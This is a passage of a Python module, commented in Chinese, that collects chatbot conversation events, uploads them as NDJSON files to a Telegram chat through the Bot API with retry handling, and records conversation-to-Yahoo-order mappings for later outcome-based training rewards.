                    self._upload_cursor[fname] = last_line + 1
        except Exception:
            pass

    # ---------- 實際上傳 ----------

    def _send_document(self, filename: str, content: str) -> bool:
        if not self.bot_token or not self.chat_id:
            return False
        url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
        body_bytes = content.encode("utf-8")
        for attempt in range(len(_VPN_BACKOFF) + 1):
            try:
                files = {"document": (filename, body_bytes, "application/x-ndjson")}
                data = {
                    "chat_id": self.chat_id,
                    "disable_notification": "true",
                    "caption": f"📊 {filename.split('_')[0]} · {len(content.splitlines())} events",
                }
                r = requests.post(url, data=data, files=files, timeout=_REQUEST_TIMEOUT)
                if r.status_code == 200:
                    try:
                        msg_id = r.json().get("result", {}).get("message_id", "?")
                        self.on_log(
                            f"[Train] ✅ uploaded {filename} "
                            f"({len(content)} bytes) msg_id={msg_id}"
                        )
                    except Exception:
                        pass
                    return True
                if r.status_code == 429:
                    retry_after = 5.0
                    try:
                        retry_after = float(r.json().get("parameters", {}).get("retry_after", 5))
                    except Exception:
                        pass
                    self.on_log(f"[Train] 429 retry_after={retry_after}s")
                    if self._stop_event.wait(retry_after):
                        return False
                    continue
                self.on_log(f"[Train] sendDocument {r.status_code} {r.text[:200]}")
            except requests.exceptions.RequestException as e:
                self.on_log(f"[Train] 網絡異常 attempt={attempt} {e}")
            except Exception as e:
                self.on_log(f"[Train] 上傳異常 attempt={attempt} {e}")

            if attempt < len(_VPN_BACKOFF):
                if self._stop_event.wait(_VPN_BACKOFF[attempt]):
                    return False
        return False

    # ---------- shutdown ----------

    def stop(self, timeout: float = 8.0):
        # 把所有未 finalize 的 conv 強制打包(at-least-once 上傳)
        with self._lock:
            keys_to_flush = list(self._conv_buffer.keys())
            for ck in keys_to_flush:
                try:
                    self._do_finalize_locked(ck, mark_finalized=False, partial=False,
                                               reason="shutdown_flush")
                except Exception:
                    pass
        self._stop_event.set()
        if self._upload_thread:
            self._upload_thread.join(timeout=timeout)
        if self._sweep_thread:
            self._sweep_thread.join(timeout=1.0)
        self._save_state_cache()
        self._save_upload_cursor()
        self._save_finalized()


# ============== 模組級單例 ==============

_COLLECTOR: Optional[TrainingCollector] = None
_INIT_LOCK = threading.Lock()


def init_collector(bot_token: str, chat_id: str, on_log: Optional[callable] = None) -> Optional[TrainingCollector]:
    global _COLLECTOR
    with _INIT_LOCK:
        if _COLLECTOR is not None:
            return _COLLECTOR
        if not bot_token or not chat_id:
            return None
        try:
            _COLLECTOR = TrainingCollector(bot_token, chat_id, on_log)
            return _COLLECTOR
        except Exception as e:
            if on_log:
                on_log(f"[Train] 初始化失敗 {e}")
            return None


def get_collector() -> Optional[TrainingCollector]:
    return _COLLECTOR


def record_event(action_type: str, **kwargs) -> str:
    c = _COLLECTOR
    if c is None:
        return ""
    try:
        return c.record(action_type, **kwargs)
    except Exception:
        return ""


def build_forum_topic_key(profile_id: str, chat_id: str, topic_id: int) -> str:
    """生成 forum 主動聯繫的 pseudo conv_key.

    格式:forum_topic|{profile_id}|{chat_id}|{topic_id}
    這樣同 topic 的多個訊息歸到同一 buffer,訓練端能看到完整「主動聯繫軌跡」.
    """
    return f"forum_topic|{profile_id or 'unknown'}|{chat_id or 'unknown'}|{topic_id}"


# ============== outcome 14d 查詢 stub(將來訓練 reward signal) ==============
# 對話結束時記下 (conv_key → yahoo_order_id, ts)
# 14 天後 outcome scanner 查 yahoo 訂單狀態(成交/糾紛/退款/復購)
# 發 outcome:* event 帶 conv_key,訓練端 join 後得到 reward

_CONV_ORDER_MAP_LOCK = threading.Lock()


def register_conv_outcome(conv_key: str, *,
                           yahoo_order_id: str = "",
                           profile_id: str = "",
                           buyer_label: str = "") -> None:
    """對話結束時呼叫.把 conv_key 跟訂單對應寫到 conv_order_map.json.

    將來 outcome_scanner.py(獨立模組,可後續實作)會:
    1. 讀此 map
    2. 對 finalized_at + 14 天 < now 的條目查 Yahoo 訂單狀態
    3. 發 outcome:dispute/repurchase/success/refund event(conv_key 一致 → 訓練端 join)
    """
    if not conv_key:
        return
    try:
        with _CONV_ORDER_MAP_LOCK:
            data = {}
            if _CONV_ORDER_MAP_FILE.exists():
                try:
                    data = json.loads(_CONV_ORDER_MAP_FILE.read_text("utf-8"))
                except Exception:
                    data = {}
            data[conv_key] = {
                "yahoo_order_id": yahoo_order_id,
                "profile_id": profile_id,
                "buyer_label": buyer_label,
                "finalized_at": _now_ts(),
                "outcome_checked": False,
            }
            # 只保留最近 5000 條(LRU)
            if len(data) > 5000:
                sorted_items = sorted(data.items(),
                                      key=lambda kv: kv[1].get("finalized_at", 0),
                                      reverse=True)
                data = dict(sorted_items[:5000])
            tmp = _CONV_ORDER_MAP_FILE.with_suffix(".tmp")
            tmp.write_text(json.dumps(data, ensure_ascii=False), "utf-8")
            tmp.replace(_CONV_ORDER_MAP_FILE)
    except Exception:
        pass


def finalize_conv(conv: Any, reason: str = "phase_end"):
    """對話結束時呼叫.接受 conv 物件(從 conv 算 conv_key)."""
    c = _COLLECTOR
    if c is None or conv is None:
        return
    try:
        ck = _build_conv_key(conv)
        c.finalize_conv(ck, reason=reason)
    except Exception:
        pass


def mark_superseded(target_event_id: str, by_event_id: str, reason: str = ""):
    c = _COLLECTOR
    if c is None or not target_event_id or not by_event_id:
        return
    try:
        c.mark_superseded(target_event_id, by_event_id, reason)
    except Exception:
        pass


def clear_conv_cache_by_conv(conv: Any):
    c = _COLLECTOR
    if c is None or conv is None:
        return
    try:
        ck = _build_conv_key(conv)
        c.clear_conv_cache(ck)
    except Exception:
        pass


def stop_collector(timeout: float = 8.0):
    global _COLLECTOR
    if _COLLECTOR is not None:
        try:
            _COLLECTOR.stop(timeout=timeout)
        except Exception:
            pass
